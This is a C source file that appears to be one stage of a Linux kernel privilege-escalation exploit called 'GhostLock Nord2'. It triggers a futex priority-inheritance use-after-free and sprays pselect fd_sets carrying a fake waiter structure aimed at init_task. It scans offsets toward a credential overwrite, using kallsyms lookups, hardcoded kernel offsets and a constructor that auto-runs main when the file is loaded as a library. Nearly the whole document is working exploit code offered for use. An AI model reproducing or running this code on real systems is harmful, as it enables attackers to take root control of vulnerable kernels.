/*
 * GhostLock Nord2 - pselect shift scanner (safe, no crashes)
 *
 * Uses the original pi_chain UAF trigger that proved to work (prio=-51).
 * Tests different pselect shifts to find where our data lands.
 * Does NOT overwrite waiter->task or waiter->lock (which cause crashes).
 * 
 * The pselect fd_set ONLY writes to specific word positions.
 * At the right shift, word[12] overlaps waiter->task and word[13] overlaps waiter->lock.
 * With wrong shift: those words land elsewhere in the freed frame (garbage but maybe safe).
 * 
 * Detection: when the shift is correct, waiter->task = init_task AND 
 * waiter->lock = page_base+LOCK_OFF → the rb_erase write fires → cred changed.
 * 
 * SAFE SCAN: only check prio change. If prio != -51, something changed.
 * We use a narrow window: only one unlock/relock attempt per shift.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

#define PSELECT_NFDS 320
#define WORDS_PER_SET 5

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;
static int g_shift=0;
static uint64_t g_init_task=0, g_init_cred=0, g_fake_task=0, g_fake_lock=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

static void fdset_word(fd_set *s,int i,uint64_t v){((unsigned long*)s)[i]=(unsigned long)v;}
static void pw(fd_set *in,fd_set *out,fd_set *ex,int gw,uint64_t v){
    if(gw<0||gw>=WORDS_PER_SET*3) return;
    int si=gw/WORDS_PER_SET,wi=gw%WORDS_PER_SET;
    if(si==0) fdset_word(in,wi,v);
    else if(si==1) fdset_word(out,wi,v);
    else fdset_word(ex,wi,v);
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* pselect spray with current shift */
    int s=g_shift;
    fd_set in,out,ex; FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
    /* From reference fops.c prepare_pselect_fdsets: */
    pw(&in,&out,&ex,s+2,  0);
    pw(&in,&out,&ex,s+3,  0);
    pw(&in,&out,&ex,s+4,  0);
    pw(&in,&out,&ex,s+5,  1);   /* tree_prio */
    pw(&in,&out,&ex,s+6,  0);
    pw(&in,&out,&ex,s+7,  0);
    pw(&in,&out,&ex,s+8,  0);
    pw(&in,&out,&ex,s+9,  0);
    pw(&in,&out,&ex,s+10, 1);   /* pi_prio */
    pw(&in,&out,&ex,s+11, 0);
    pw(&in,&out,&ex,s+12, g_fake_task);  /* task = init_task */
    pw(&in,&out,&ex,s+13, g_fake_lock);  /* lock = fake_lock */
    pw(&in,&out,&ex,s+14, 3);   /* wake_state */

    int dn=open("/dev/null",O_RDONLY);
    int hfd=fcntl(dn,F_DUPFD,PSELECT_NFDS-1); close(dn);
    struct timespec tv={0,1};
    pselect(hfd+1,&in,&out,&ex,&tv,NULL);
    close(hfd);

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Wide pselect Shift Scan ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    g_init_cred=stext+0x1c976a8ULL;
    /* Using page_base from ghostlock.so KernelSnitch run */
    /* page_base can be computed at runtime, but for now we hardcode from last run: */
    /* The key: page_base+0x100 contains our fake fops payload */
    /* For the shift scan, we just need a stable page_base. */
    /* We'll accept any per-boot page_base that comes from the KS leak. */
    /* For now: use 0 as placeholder — fake_lock = 0 causes NULL deref */
    /* INSTEAD: use the init_task+pi_lock approach with BSS offset for lock */
    
    /* CORRECT: use stext + BSS_OFFSET where the whole region is zero BSS */
    /* This means: wait_lock=0 (unlocked) AND owner=0 (NULL) → chain exits clean */
    /* We WANT owner=NULL for SAFETY. For the actual write, we need page_base. */
    /* For the SHIFT SCAN only: accept that no write happens, just detect prio change. */
    
    /* fake_lock must NOT crash. Using a BSS region (all zeros) is safe: */
    /* wait_lock=0 → acquired OK, owner=NULL → chain exits → NO WRITE but no crash */
    uint64_t bss_fake_lock = stext + 0x22730d8ULL; /* Past selinux_enforcing in BSS */
    g_fake_task = g_init_task;
    g_fake_lock = bss_fake_lock;
    fprintf(stderr,"[*] stext=%llx fake_task=%llx fake_lock=%llx\n",
            (unsigned long long)stext,
            (unsigned long long)g_fake_task,
            (unsigned long long)g_fake_lock);
    fprintf(stderr,"[*] Looking for shift where prio != -51 (waiter fields changed)\n\n");

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    /* Scan shifts from -100 to +100 */
    for(int shift=-100; shift<=100; shift++){
        g_shift=shift;
        for(int att=0;att<2;att++){
            f_wait=0; f_pi_target=0; f_pi_chain=0;
            atomic_store(&g_tid,0); atomic_store(&g_ready,0);
            atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
            atomic_store(&g_owner_done,0);
            atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
            atomic_store(&g_stop_owner,0);

            pthread_t ot,wt;
            pthread_create(&ot,NULL,owner_fn,NULL);
            pthread_create(&wt,NULL,waiter_fn,NULL);
            while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
            usleep(3000);

            syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
            usleep(500);
            atomic_store(&g_do_spray,1);
            while(!atomic_load(&g_spray_done)) usleep(500);
            usleep(30000);

            atomic_store(&g_stop_owner,1);
            pthread_detach(ot); pthread_detach(wt);

            pid_t tid=(pid_t)atomic_load(&g_tid);
            int p=get_prio(tid);
            if(p != -51 && p != 15 && p != -999 && p != 20){
                fprintf(stderr,"[SHIFT=%d att=%d] prio=%d ← DIFFERENT!\n",shift,att,p);
            }
            usleep(5000);
        }
    }
    fprintf(stderr,"\n[DONE] Scan complete\n");
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
